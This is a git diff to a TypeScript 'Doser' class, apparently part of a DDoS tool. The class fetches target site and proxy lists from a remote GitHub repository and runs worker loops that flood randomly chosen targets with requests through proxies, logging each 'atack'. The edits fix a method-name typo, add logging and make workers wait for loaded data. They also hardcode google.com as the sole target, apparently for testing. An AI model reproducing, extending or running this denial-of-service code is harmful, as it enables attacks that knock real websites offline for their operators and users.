@@ -55,7 +55,7 @@ export class Doser {
   }
 
   private updateTargetsAndProxies() {
-    this.getSitesAndProxyes()
+    this.getSitesAndProxies()
       .then(data => {
         this.loadedTargetsAndProxies = data
       })
@@ -66,22 +66,28 @@ export class Doser {
     this.onlyProxy = newVal
   }
 
-  async getSitesAndProxyes () {
+  async getSitesAndProxies () {
     try {
+      console.log('Loading targets and proxies;')
       const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
       const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
-
+      // https://www.wikipedia.org/
       if (sitesResponse.status === 200 && proxyResponse.status === 200) {
         const sites = sitesResponse.data as Array<SiteData>
         const proxyes = proxyResponse.data as Array<ProxyData>
 
+        console.log('Targets and proxies were loaded;')
         return {
-          sites,
+          sites: [
+            {
+              page: 'https://www.google.com/'
+            }
+          ],
           proxyes
         }
       }
     } catch (e) {
-      console.log('Error while loading hosts')
+      console.log('Error while loading hosts and proxies: ', e)
       return null
     }
     return null
@@ -112,20 +118,16 @@ export class Doser {
   }
 
   private async worker (workerIndex: number) {
-    let config = await this.getSitesAndProxyes()
     while (this.working) {
-      if (!this.workerActive[workerIndex]) {
-        await new Promise(resolve => setTimeout(resolve, 10000))
+      //What until worker enabled and data loaded
+      if (!this.workerActive[workerIndex] || this.loadedTargetsAndProxies == null) {
+        await new Promise(resolve => setTimeout(resolve, 1000))
         continue
       }
 
-      if (config == null) {
-        break
-      }
-
       const target = {
-        site: config.sites[Math.floor(Math.random() * config.sites.length)],
-        proxy: config.proxyes
+        site: this.loadedTargetsAndProxies.sites[Math.floor(Math.random() * this.loadedTargetsAndProxies.sites.length)],
+        proxy: this.loadedTargetsAndProxies.proxyes
       } as TargetData
 
       // check if direct request can be performed
@@ -170,7 +172,7 @@ export class Doser {
               }
             })
 
-            this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })
+            this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | PROXY | ${r.status} | ${target.site.page_time} ms` })
 
             if (r.status === 407) {
               console.log('Proxy requires auth: ', proxy)
@@ -178,7 +180,6 @@ export class Doser {
             }
           }
         } catch (e) {
-          console.log('Request error')
           proxy = null
           let code = (e as AxiosError).code
           if (code === undefined) {
@@ -192,5 +193,7 @@ export class Doser {
         }
       }
     }
+
+    console.log('Worker finished its work: ', workerIndex);
   }
 }
